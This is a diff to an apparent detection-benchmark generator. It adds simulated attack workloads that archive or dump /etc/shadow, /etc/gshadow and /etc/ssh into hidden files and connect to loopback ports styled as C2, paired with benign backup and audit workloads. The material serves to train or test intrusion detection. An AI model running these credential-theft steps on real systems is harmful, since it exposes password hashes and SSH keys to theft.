@@ -192,6 +192,47 @@ def evasion_slow(wd, rng, act):
         time.sleep(rng.uniform(2.0, 5.0))
 
 
+def exfil_staging(wd, rng, act):
+    """MATCHED PAIR with benign_backup_etc: the same `tar` over /etc, but it stages
+    only the secrets into a hidden file and then phones out. Context, not the
+    binary, is what differs (what is archived, where it lands, what follows)."""
+    assert_loopback("127.0.0.2")
+    stage = os.path.join(wd, ".cache-update.tgz")
+    for rnd in range(3):
+        act("stage_secrets_with_tar", malicious=True, round=rnd)
+        run(["sudo", "-n", "tar", "czf", stage, "/etc/shadow", "/etc/gshadow", "/etc/ssh"])
+        for k in range(3):
+            act("send_out", malicious=True, round=rnd, n=k)
+            s_ = socket.socket()
+            s_.settimeout(0.3)
+            s_.connect_ex(("127.0.0.2", 8443))
+            s_.close()
+            time.sleep(0.3)
+        try:
+            os.remove(stage)
+        except OSError:
+            pass
+        time.sleep(rng.uniform(0.5, 1.5))
+
+
+def credential_dump(wd, rng, act):
+    """MATCHED PAIR with benign_credential_audit: both read /etc/shadow with a
+    standard tool as root. The attack writes the whole file out and then
+    connects to a C2-style port; the audit only counts."""
+    assert_loopback("127.0.0.2")
+    loot = os.path.join(wd, ".d")
+    for rnd in range(3):
+        act("dump_shadow_to_file", malicious=True, round=rnd)
+        with open(loot, "wb") as f:
+            run(["sudo", "-n", "cat", "/etc/shadow"], stdout=f)
+        act("beacon_after_dump", malicious=True, round=rnd)
+        s_ = socket.socket()
+        s_.settimeout(0.3)
+        s_.connect_ex(("127.0.0.2", 4444))
+        s_.close()
+        time.sleep(rng.uniform(0.5, 1.5))
+
+
 # --------------------------------------------------------------------------
 # Benign workloads
 # --------------------------------------------------------------------------
@@ -265,6 +306,33 @@ def admin_privileged_workload(wd, rng, act):
             time.sleep(rng.uniform(0.3, 1.0))
 
 
+def backup_etc_workload(wd, rng, act):
+    """MATCHED PAIR with exfil_staging: the same `sudo tar` over /etc (which includes
+    /etc/shadow), written to a normal backup location (the scratch dir), verified by
+    checksum, with no network activity."""
+    for rnd in range(3):
+        archive = os.path.join(wd, f"etc-backup-{rnd}.tgz")
+        act("backup_etc", round=rnd)
+        run(["sudo", "-n", "tar", "czf", archive, "/etc"], timeout=90)
+        act("verify_backup", round=rnd)
+        run(["sudo", "-n", "sha256sum", archive])
+        time.sleep(rng.uniform(0.5, 1.5))
+
+
+def credential_audit_workload(wd, rng, act):
+    """MATCHED PAIR with credential_dump: the same root read of /etc/shadow with
+    standard tools, as a password-policy audit would do (counts and checks only:
+    nothing is written out, nothing connects out)."""
+    audits = [["sudo", "-n", "grep", "-c", "^root:", "/etc/shadow"],
+              ["sudo", "-n", "awk", "-F:", "$2==\"\" {n++} END {print n+0}", "/etc/shadow"],
+              ["sudo", "-n", "wc", "-l", "/etc/shadow"]]
+    for rnd in range(3):
+        for c in audits:
+            act("credential_audit", cmd=c[2], round=rnd)
+            run(c)
+            time.sleep(rng.uniform(0.2, 0.6))
+
+
 def idle_workload(wd, rng, act):
     act("idle")
     time.sleep(25)
@@ -278,12 +346,16 @@ SCENARIOS = {
     "network_c2":             ("attack", "network_c2",           network_c2,              35),
     "memory_exploit":         ("attack", "memory_exploit",       memory_exploit,           8),
     "evasion_slow":           ("attack", "evasion",              evasion_slow,            60),
+    "exfil_staging":          ("attack", "exfil_staging",        exfil_staging,           12),
+    "credential_dump":        ("attack", "credential_dump",      credential_dump,          8),
     "benign_compile":         ("benign", "compile",              compile_workload,        10),
     "benign_database":        ("benign", "database",             database_workload,       10),
     "benign_web":             ("benign", "web",                  web_workload,            15),
     "benign_admin":           ("benign", "admin",                admin_workload,          15),
     "benign_admin_privileged":("benign", "admin_privileged",     admin_privileged_workload, 25),
     "benign_idle":            ("benign", "idle",                 idle_workload,           26),
+    "benign_backup_etc":      ("benign", "backup_etc",           backup_etc_workload,     14),
+    "benign_credential_audit":("benign", "credential_audit",     credential_audit_workload, 8),
 }
 
 
